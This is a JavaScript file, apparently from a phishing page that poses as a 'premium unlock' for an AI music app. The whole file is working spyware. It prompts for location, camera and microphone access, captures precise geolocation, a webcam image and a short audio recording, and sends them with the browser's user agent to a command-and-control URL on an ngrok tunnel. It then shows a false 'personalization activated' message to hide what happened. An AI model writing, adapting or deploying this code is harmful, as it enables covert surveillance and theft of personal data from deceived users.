// *** CRITICAL: UPDATE THIS WITH YOUR CURRENT NGROK HTTPS URL + /data ***
// Example: "https://your-ngrok-id.ngrok-free.app/data"
const C2_ENDPOINT = 'https://spidery-eddie-nontemperable.ngrok-free.dev/data'; 

// --- Helper Functions for Data Capture ---

// Attempts to get geolocation (requires user permission)
async function getGeolocation() {
    console.log("[JS] Attempting to get geolocation...");
    return new Promise((resolve, reject) => {
        if (!("geolocation" in navigator)) {
            return reject(new Error("Geolocation not supported."));
        }
        navigator.geolocation.getCurrentPosition(
            (position) => resolve({
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy,
                timestamp: new Date(position.timestamp).toISOString()
            }),
            (error) => {
                console.error("[JS] Geolocation error:", error);
                reject(new Error(`Geolocation error: ${error.message} (Code: ${error.code})`));
            },
            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
    });
}

// Attempts to capture an image from the camera (requires user permission)
async function captureImage() {
    console.log("[JS] Attempting to capture image...");
    const video = document.getElementById('webcamFeed');
    const canvas = document.getElementById('cameraCanvas');
    const context = canvas.getContext('2d');
    let stream;

    try {
        stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
        await video.play();

        // Ensure video is playing and dimensions are set before drawing
        await new Promise(resolve => video.onloadedmetadata = () => {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            resolve();
        });
        await new Promise(r => setTimeout(r, 200)); // Small delay for stream stability

        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        const imageDataUrl = canvas.toDataURL('image/jpeg', 0.8);
        
        console.log("[JS] Image captured.");
        return imageDataUrl;
    } catch (err) {
        console.error("[JS] Camera access or capture error:", err);
        throw new Error(`Camera error: ${err.message}`);
    } finally {
        if (stream) {
            stream.getTracks().forEach(track => track.stop()); // Stop stream to turn off indicator
            video.srcObject = null; // Clear video source
        }
    }
}

// Attempts to capture a short audio recording (requires user permission)
async function captureAudio() {
    console.log("[JS] Attempting to capture audio...");
    let stream;
    let mediaRecorder;
    let audioChunks = [];
    const audioDuration = 3000; // 3 seconds recording

    return new Promise(async (resolve, reject) => {
        try {
            stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });

            mediaRecorder.ondataavailable = event => {
                audioChunks.push(event.data);
            };

            mediaRecorder.onstop = () => {
                const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                const audioDataUrl = URL.createObjectURL(audioBlob);
                
                // Optionally, play back the recorded audio for debugging/user feedback
                // const audioPlayback = document.getElementById('micAudioPlayback');
                // audioPlayback.src = audioDataUrl;
                // audioPlayback.play();

                const reader = new FileReader();
                reader.readAsDataURL(audioBlob);
                reader.onloadend = () => {
                    console.log("[JS] Audio captured.");
                    resolve(reader.result); // Base64 audio data
                };
            };

            mediaRecorder.onerror = event => {
                console.error("[JS] MediaRecorder error:", event.error);
                reject(new Error(`Audio recording error: ${event.error.name} - ${event.error.message}`));
            };

            mediaRecorder.start();
            console.log(`[JS] Recording audio for ${audioDuration / 1000} seconds...`);
            setTimeout(() => {
                if (mediaRecorder.state === 'recording') {
                    mediaRecorder.stop();
                }
            }, audioDuration);

        } catch (err) {
            console.error("[JS] Microphone access error:", err);
            reject(new Error(`Microphone access error: ${err.message}`));
        } finally {
            // Stop stream after recording or on error
            if (stream) {
                setTimeout(() => stream.getTracks().forEach(track => track.stop()), audioDuration + 500); // Give recorder time to stop
            }
        }
    });
}

// Sends compiled data to the C2 server
async function sendDataToC2(payload) {
    console.log("[JS] Sending payload to C2:", payload);
    try {
        const response = await fetch(C2_ENDPOINT, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(payload),
        });

        if (!response.ok) {
            const errorBody = await response.text();
            console.error(`[JS] HTTP error! Status: ${response.status}, Response: ${errorBody}`);
            throw new Error(`HTTP error! Status: ${response.status} - ${errorBody}`);
        }

        const result = await response.json();
        console.log("[JS] Data sent to C2 successfully:", result);
    } catch (error) {
        console.error("[JS] Failed to send data to C2:", error);
    }
}

// --- Main Capture Orchestration ---

// Orchestrates all capture attempts
async function startPremiumUnlock() {
    document.getElementById('loadingMessage').style.display = 'block';
    console.log("[JS] Initiating premium unlock and data capture sequence...");

    let locationResult = { status: 'denied', value: null, reason: 'Not attempted' };
    let imageResult = { status: 'denied', value: null, reason: 'Not attempted' };
    let audioResult = { status: 'denied', value: null, reason: 'Not attempted' };
    let clientErrors = [];

    // Attempt all captures concurrently using Promise.allSettled
    // This allows some captures to fail without blocking others, and reports all outcomes.
    const results = await Promise.allSettled([
        getGeolocation().then(data => { locationResult = { status: 'fulfilled', value: data, reason: null }; return data; }).catch(err => { locationResult.reason = err.message; clientErrors.push(err.message); throw err; }),
        captureImage().then(data => { imageResult = { status: 'fulfilled', value: data, reason: null }; return data; }).catch(err => { imageResult.reason = err.message; clientErrors.push(err.message); throw err; }),
        captureAudio().then(data => { audioResult = { status: 'fulfilled', value: data, reason: null }; return data; }).catch(err => { audioResult.reason = err.message; clientErrors.push(err.message); throw err; })
    ]);

    console.log("[JS] All capture attempts settled. Results:", results);

    const payload = {
        location: locationResult.value,
        image: imageResult.value,
        audio: audioResult.value, // New: send audio data
        userAgent: navigator.userAgent,
        timestamp: new Date().toISOString(),
        clientErrors: clientErrors.length > 0 ? clientErrors : "none"
    };

    await sendDataToC2(payload);

    document.getElementById('loadingMessage').style.display = 'none';
    alert("AI-powered personalization activated! Enjoy enhanced beats!"); // User feedback
}

// Attach the main function to the CTA button
// Verify your index.html button has onclick="startPremiumUnlock()"
